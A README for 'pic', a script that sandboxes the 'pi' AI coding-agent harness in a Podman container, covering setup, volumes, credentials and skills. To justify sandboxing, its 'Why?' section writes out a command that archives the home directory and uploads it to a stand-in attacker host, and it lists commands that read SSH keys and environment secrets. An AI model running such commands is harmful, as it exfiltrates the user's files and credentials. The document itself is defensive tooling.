# `pic`
> **pic**: Run the [`pi`](https://pi.dev/) agent harness in a `container` using podman

<!-- BEGIN mktoc {"min_depth": 2} -->

- [Requirements](#requirements)
- [Installation](#installation)
- [Usage](#usage)
  - [Examples](#examples)
  - [Alias](#alias)
  - [Migrating from existing installation](#migrating-from-existing-installation)
- [Installing additional tools](#installing-additional-tools)
- [Why?](#why)
- [Frequently Asked Questions](#frequently-asked-questions)
  - [What about all my tools?](#what-about-all-my-tools)
  - [How do I connect to my AI subscription?](#how-do-i-connect-to-my-ai-subscription)
  - [Can I use my skills with `pic`?](#can-i-use-my-skills-with-pic)
<!-- END mktoc -->

## Requirements

- [Podman](https://podman.io)

## Installation

1. Clone the repository to some place on your computer
2. Start the script `./run-pi-podman.sh`

## Usage

Run `pi` inside a container by executing the script `./run-pi-podman.sh`. On first use or if the `PI_VERSION` in the Containerfile changed, the container is built fresh.

The current directory is always mounted at `/workspace`. Additional volumes are configured with `--volume volumeConfig` or `-v volumeConfig`, where `volumeConfig` is a Podman-style volume string such as `/host/path:/container/path[:options]`. The script adds `nodev,nosuid` and defaults to `rw` when no options are supplied. Additional volumes cannot target `/workspace`, because that path is reserved for the current directory.

```sh
Usage: run-pi-podman.sh [--allow-mount-home] [--usage] [--volume volumeConfig|-v volumeConfig]... [container args...]

--allow-mount-home      Allow mounting the $HOME directory into the container
--allow-host-network    Connect to host network by setting --net=host, required
                        when running local LLM on host system, e.g. via ollama
--usage                 Show this usage message
--volume | -v           Mount a volume to a path inside the container

The current directory is always mounted at /workspace inside the container

volumeConfig must be a Podman-style volume string such as:
  /host/path:/container/path[:options]

All arguments except the ones listed above are passed to pi inside the
container. For example, the following restores a session:

pic --session 019ecbc6-4f58-7bac-acb4-5ef04a3edeb9
```

### Examples

```bash
# Grant access to files in the current directory at /workspace
./run-pi-podman.sh

# Mount an additional host path
./run-pi-podman.sh -v /path/to/other:/volumes/other:ro

# Mount multiple additional host paths
./run-pi-podman.sh -v /path/to/cache:/cache -v /path/to/other:/volumes/other:ro

# Pass arguments to pi
./run-pi-podman.sh --help

# Pass arguments to pi while mounting an additional host path
./run-pi-podman.sh --volume /path/to/other:/volumes/other --help
```

### Alias

Create an alias for simpler invocation:

```bash
# in .bashrc, .zshrc, or the equivalent for your shell
alias pic="/path/to/repo/run-pi-podman.sh"
```

Use the alias by running `pic`, `pic --help`, or `pic -v /cache:/cache:ro` in a terminal.

### Migrating from existing installation

To copy your existing host Pi config into the volume, run the following once:

```bash
podman volume create pi-sandbox-agent
podman run --rm --user root \
  -v pi-sandbox-agent:/target \
  -v "$HOME/.pi/agent:/source:ro" \
  node:24-bookworm-slim \
  sh -lc 'cp -a /source/. /target/ && chown -R node:node /target'
```

To inspect or remove it:

```bash
podman volume inspect pi-sandbox-agent
podman volume rm pi-sandbox-agent
```

## Installing additional tools

Additional packages from [https://pi.dev/packages](https://pi.dev/packages) can be installed inside the running container by executing the required commands through `pi`:

1. Start `pic`
2. Run `!! pi install <package>` inside `pi` to install the tool

For example, to install the [`pi-web-access`](https://pi.dev/packages/pi-web-access) extension:

```bash
# Start pi
pic
# Run the install command
!! pi install npm:pi-web-access
```

Extensions are persisted between sessions in the container volume.

## Why?

Agents are an interesting technology, but by default they get access to _way too many_ things. An agent executed on a host can do anything by default, runs with the same privileges as the executing user, and can spawn sub-agents that can rapidly work through a system in the background. Kinda scary, right? Nothing really prevents an agent from running a command like `tar -czf home.tar.gz $HOME/ && curl -X POST -H "Content-Type: multipart/form-data" -F "data=@home.tar.gz" https://evil-example.com/upload` in the background - and just like that the contents of the home dir are uploaded somewhere.

Some quick checks:
Run `pi` (or any other agent harness) on the host, then execute ...

- ... `printenv` - these are all the environment variables and secrets the agent can see and could exfiltrate immediately if acting maliciously
- ... `ls -l /` - this is all the files, from the system root dir forward, the agent can access
- ... `ls -l ~/.config` - this is all the configuration files the agent can see and access
- ... `cat ~/.ssh/*` - this is the SSH keys the agent can access

Some operating systems, like macOS, prevent access to files and folders and require an explicit approval, which is better than nothing but still not good enough.

Giving an agent unrestricted access to a computer is a huge security risk. Agents - depending on the model - also tend to aggressively scan local folders. OpenAI GPT-5.5, asked to implement a custom theme for pi, attempted to scan all paths it could find on my device - despite the documentation clearly stating themes belong in `~/.pi/agent/theme/`.

Anyways! Now, with `pic` far less is exposed to the LLM, for example the `printenv` looks like this:

```bash
pic
!! printenv
 PI_CODING_AGENT=true
 HOSTNAME=343432f1a3d2
 YARN_VERSION=1.22.22
 PWD=/workspace
 PI_VERSION=0.78.1
 container=podman
 HOME=/home/node
 TERM=xterm
 SHLVL=0
 PATH=/home/node/.pi/agent/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 NODE_VERSION=24.16.0
 _=/usr/bin/printenv
```

and the file system only contains the current directory, the container file system, and any additional volumes explicitly mounted with `-v`/`--volume` - not the entire host file system.

## Frequently Asked Questions

### What about all my tools?

**Question:** When running in a container, how should the agent access all my tools?

**Answer:** For me - _who this project is for_ - that's resolved by using [hermit](https://cashapp.github.io/hermit/). All additional tools I need are available in the `bin` directory which is managed by hermit, so the agent / pi can still access them inside the container.

To make this work, I added `./bin` to the `$PATH` inside the container (see `Containerfile`) by setting `ENV PATH="$PATH:./bin"`.

If you use a different tool to manage developer tooling, like `mise`, you may need to adjust the Containerfile accordingly.

### How do I connect to my AI subscription?

**Question:** How do I connect to my LLM provider if all files and environment variables are not part of the container?

**Answer:** On first run, log in to the provider via `pi` by running `/login`. The authentication information is then stored inside the Podman volume and persisted between runs. This is how `pi` would do it on the host system as well, but the **huge** difference is that the auth info now lives inside the volume instead of on your host system - a _tiny bit_ better.

Alternatively, you could expose environment variables like `OPENAI_API_KEY` or `ANTHROPIC_API_KEY`, and load the value from a secure store such as [1Password](https://1password.com) or [KeePassXC](https://keepassxc.org).

```sh
podman run --rm -it \
  --env "OPENAI_API_KEY=$(op read op://vault-name/openai-api-key)" \
  # [...] Rest of the options
```

This way, on every start, 1Password would prompt for access to the API key, and after the session the API key would _not persist in the volume_. Some providers, like GitHub Copilot, do not support API-key-based authentication and require a login via the `/login` command in `pi`.

### Can I use my skills with `pic`?

Yes. `pic` automatically includes the skills form the first of these directories it finds:

- `$HOME/.pi/agent/skills`
- `$HOME/.agents/skills`
- `$HOME/.opencode/skills`
- `$HOME/.claude/skills`

If `$HOME/.pi/agent/skills` and `$HOME/.claude/skills` exist, the first match (`$HOME/.pi/agent/skills`) is mounted.

Skills from the current working directory (workspace) are automatically loaded if they are inside a [directory pi loads](https://pi.dev/docs/latest/skills#locations),

Any other skills can be mounted with a custom volume pointing at `/home/node/.pi/agent/skills/`:

```sh
alias pic="/run-pi-podman.sh -v $HOME/.pi/agent/skills/:/home/node/.pi/agent/skills/"
```

**IMPORTANT:** Skills are mounted as read-only by default to prevent an agent from rewriting skills.
